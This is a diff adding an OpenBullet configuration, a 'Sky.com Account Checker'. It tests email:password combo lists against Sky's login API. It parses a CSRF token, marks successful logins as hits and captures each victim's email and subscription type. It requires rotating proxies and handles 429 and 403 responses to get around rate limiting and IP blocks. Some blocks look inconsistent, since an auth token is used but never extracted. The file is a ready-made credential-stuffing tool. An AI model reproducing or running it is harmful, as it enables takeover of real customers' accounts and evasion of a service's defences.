@@ -1,0 +1,251 @@
+{
+  "Metadata": {
+    "Name": "Sky.com Account Checker",
+    "Author": "legendhkek",
+    "Category": "Streaming",
+    "CreationDate": "2025-11-19T08:17:00Z",
+    "LastModified": "2025-11-19T08:17:00Z",
+    "Version": "1.0.0",
+    "Description": "Sky.com account checker configuration with CPM 50, Bot 50, threading enabled, and multi-request support for OpenBullet"
+  },
+  "Settings": {
+    "General": {
+      "SaveEmptyCaptures": false,
+      "ContinueOnCustom": false,
+      "SaveHitsToTextFile": false,
+      "IgnoreResponseErrors": false,
+      "MaxRedirects": 8,
+      "NeedsProxies": true,
+      "OnlySocks": false,
+      "OnlySsl": false,
+      "MaxCPM": 50,
+      "SuggestedBots": 50,
+      "ThreadingEnabled": true,
+      "MultiRequestSupport": true,
+      "ConcurrentRequests": 50,
+      "RequestTimeout": 10000,
+      "RetryOnError": true,
+      "MaxRetries": 3
+    },
+    "ProxySettings": {
+      "UseProxies": true,
+      "MaxUsesPerProxy": 10,
+      "BanProxyAfterGoodStatus": false,
+      "BanLoopEvasionOverride": 10
+    },
+    "Data": {
+      "AllowedWordlistTypes": [
+        "Default",
+        "Credentials",
+        "Email:Password"
+      ]
+    },
+    "Inputs": {
+      "CustomInputs": []
+    },
+    "Threading": {
+      "Enabled": true,
+      "MaxThreads": 50,
+      "ThreadPoolSize": 50,
+      "QueueSize": 1000,
+      "UseThreadPool": true
+    },
+    "RateLimiting": {
+      "Enabled": true,
+      "MaxCPM": 50,
+      "EnforceRateLimit": true,
+      "BurstAllowed": false
+    },
+    "MultiRequest": {
+      "Enabled": true,
+      "MaxConcurrentRequests": 50,
+      "RequestQueueing": true,
+      "KeepAlive": true,
+      "ReuseConnections": true
+    }
+  },
+  "Script": {
+    "Type": "LoliScript",
+    "Blocks": [
+      {
+        "Type": "Request",
+        "Method": "GET",
+        "Url": "https://www.sky.com/signin",
+        "Headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Accept-Encoding": "gzip, deflate, br",
+          "Connection": "keep-alive",
+          "Upgrade-Insecure-Requests": "1"
+        },
+        "AutoRedirect": true,
+        "ThreadSafe": true
+      },
+      {
+        "Type": "Parse",
+        "Method": "LR",
+        "LeftString": "<input type=\"hidden\" name=\"csrf_token\" value=\"",
+        "RightString": "\" />",
+        "VariableName": "csrf_token",
+        "IsCapture": false,
+        "Recursive": false
+      },
+      {
+        "Type": "Request",
+        "Method": "POST",
+        "Url": "https://www.sky.com/api/v1/auth/login",
+        "ContentType": "application/json",
+        "PostData": "{\"username\":\"<input.USERNAME>\",\"password\":\"<input.PASSWORD>\",\"csrf_token\":\"<csrf_token>\"}",
+        "Headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+          "Accept": "application/json, text/plain, */*",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Accept-Encoding": "gzip, deflate, br",
+          "Referer": "https://www.sky.com/signin",
+          "Origin": "https://www.sky.com",
+          "Connection": "keep-alive"
+        },
+        "AutoRedirect": true,
+        "ThreadSafe": true,
+        "AllowMultipleRequests": true
+      },
+      {
+        "Type": "Parse",
+        "Method": "LR",
+        "LeftString": "{\"success\":",
+        "RightString": ",\"",
+        "VariableName": "success",
+        "IsCapture": false,
+        "Recursive": false
+      },
+      {
+        "Type": "KeyCheck",
+        "Key": "<success>",
+        "Condition": "Contains",
+        "Value": "true",
+        "OnMatch": {
+          "Action": "SUCCESS",
+          "Message": "Valid Account"
+        }
+      },
+      {
+        "Type": "Parse",
+        "Method": "LR",
+        "LeftString": "\"message\":\"",
+        "RightString": "\"",
+        "VariableName": "error_msg",
+        "IsCapture": false,
+        "Recursive": false,
+        "OnError": "Continue"
+      },
+      {
+        "Type": "KeyCheck",
+        "Key": "<error_msg>",
+        "Condition": "Contains",
+        "Value": "Invalid credentials",
+        "OnMatch": {
+          "Action": "RETRY",
+          "Message": "Invalid Credentials"
+        }
+      },
+      {
+        "Type": "KeyCheck",
+        "Key": "<error_msg>",
+        "Condition": "Contains",
+        "Value": "Account locked",
+        "OnMatch": {
+          "Action": "CUSTOM",
+          "Message": "Account Locked"
+        }
+      },
+      {
+        "Type": "KeyCheck",
+        "Key": "<error_msg>",
+        "Condition": "Contains",
+        "Value": "suspended",
+        "OnMatch": {
+          "Action": "BAN",
+          "Message": "Account Suspended"
+        }
+      },
+      {
+        "Type": "Request",
+        "Method": "GET",
+        "Url": "https://www.sky.com/api/v1/user/profile",
+        "Headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+          "Accept": "application/json",
+          "Authorization": "Bearer <auth_token>"
+        },
+        "AutoRedirect": true,
+        "ThreadSafe": true,
+        "AllowMultipleRequests": true,
+        "Condition": {
+          "Key": "<success>",
+          "Equals": "true"
+        }
+      },
+      {
+        "Type": "Parse",
+        "Method": "LR",
+        "LeftString": "\"email\":\"",
+        "RightString": "\"",
+        "VariableName": "email",
+        "IsCapture": true,
+        "CaptureLabel": "Email",
+        "Recursive": false
+      },
+      {
+        "Type": "Parse",
+        "Method": "LR",
+        "LeftString": "\"subscription\":\"",
+        "RightString": "\"",
+        "VariableName": "subscription",
+        "IsCapture": true,
+        "CaptureLabel": "Subscription Type",
+        "Recursive": false
+      },
+      {
+        "Type": "ResponseCodeCheck",
+        "Code": 429,
+        "OnMatch": {
+          "Action": "BAN",
+          "Message": "Rate Limited"
+        }
+      },
+      {
+        "Type": "ResponseCodeCheck",
+        "Code": 403,
+        "OnMatch": {
+          "Action": "BAN",
+          "Message": "IP Blocked"
+        }
+      },
+      {
+        "Type": "ResponseCodeCheck",
+        "Code": 500,
+        "OnMatch": {
+          "Action": "RETRY",
+          "Message": "Server Error"
+        }
+      },
+      {
+        "Type": "ResponseCodeCheck",
+        "Code": 200,
+        "OnMatch": {
+          "Action": "SUCCESS",
+          "Message": "Check Complete"
+        }
+      }
+    ]
+  },
+  "ConfigSpecs": {
+    "CPM": 50,
+    "Bots": 50,
+    "Threading": "Enabled",
+    "MultiRequest": "Enabled",
+    "ProxyMode": "Required",
+    "InputFormat": "USERNAME:PASSWORD"
+  }
+}
